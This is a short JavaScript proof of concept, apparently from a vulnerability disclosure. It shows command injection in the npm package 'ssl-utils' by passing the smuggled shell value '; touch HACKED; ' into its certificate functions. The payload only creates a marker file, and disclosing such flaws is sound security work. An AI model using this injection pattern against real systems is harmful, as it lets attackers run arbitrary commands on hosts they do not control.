var ssl = require('ssl-utils');
ssl.createCertRequest({}, "; touch HACKED; ", "", ()=>{})
// or:
// ssl.createCert({}, "; touch HACKED; ", "", "", "", () => {})
